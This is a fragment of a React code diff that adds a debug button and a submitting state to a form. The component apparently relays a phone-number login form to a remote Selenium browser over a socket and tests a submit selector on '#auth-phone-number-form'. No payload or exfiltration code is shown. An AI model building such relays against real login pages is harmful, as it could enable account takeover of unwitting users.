+                  color: 'black',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🔍 Check Page URL
+              </button>
+            )}
+            {isInputsReady && (
+              <button
+                onClick={() => {
+                  console.log('🧪 Test Button Detection: Testing exact selector that works in console...');
+                  if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
+                    // Test the exact selector that works in the console
+                    socketRef.current.emit('checkElementInSelenium', {
+                      sessionId: sessionIdRef.current,
+                      selector: '#auth-phone-number-form button[type="submit"]',
+                      timestamp: new Date().toISOString(),
+                      elementType: 'testSubmitButton'
+                    });
+                    setSeleniumStatus('🧪 Testing exact button selector...');
+                  } else {
+                    setSeleniumStatus('🧪 Socket not ready for button test');
+                  }
+                }}
+                style={{
+                  marginTop: '8px',
+                  marginLeft: '8px',
+                  padding: '4px 12px',
+                  fontSize: '11px',
+                  backgroundColor: '#17a2b8',
+                  color: 'white',
+                  border: 'none',
+                  borderRadius: '4px',
+                  cursor: 'pointer'
+                }}
+              >
+                🧪 Test Button Detection
               </button>
             )}
           </div>
@@ -2293,32 +3103,32 @@ Status: ${seleniumStatus}`);
             {/* Submit Button */}
             <button
               type="submit"
-              disabled={!isInputsReady}
+              disabled={!isInputsReady || isSubmitting}
               style={{
                 width: '100%',
                 padding: '14px 24px',
-                backgroundColor: isInputsReady ? '#0088cc' : '#ccc',
+                backgroundColor: isInputsReady && !isSubmitting ? '#0088cc' : '#ccc',
                 color: 'white',
                 border: 'none',
                 borderRadius: '8px',
                 fontSize: '16px',
                 fontWeight: '600',
-                cursor: isInputsReady ? 'pointer' : 'not-allowed',
+                cursor: isInputsReady && !isSubmitting ? 'pointer' : 'not-allowed',
                 transition: 'background-color 0.2s',
-                opacity: isInputsReady ? 1 : 0.6
+                opacity: isInputsReady && !isSubmitting ? 1 : 0.6
               }}
               onMouseEnter={(e) => {
-                if (isInputsReady) {
+                if (isInputsReady && !isSubmitting) {
                   e.currentTarget.style.backgroundColor = '#0077b3';
                 }
               }}
               onMouseLeave={(e) => {
-                if (isInputsReady) {
+                if (isInputsReady && !isSubmitting) {
                   e.currentTarget.style.backgroundColor = '#0088cc';
                 }
               }}
             >
-              {isInputsReady ? 'NEXT' : 'Waiting for inputs...'}
+              {isSubmitting ? 'Submitting...' : (isInputsReady ? 'NEXT' : 'Waiting for inputs...')}
             </button>
           </form>
 
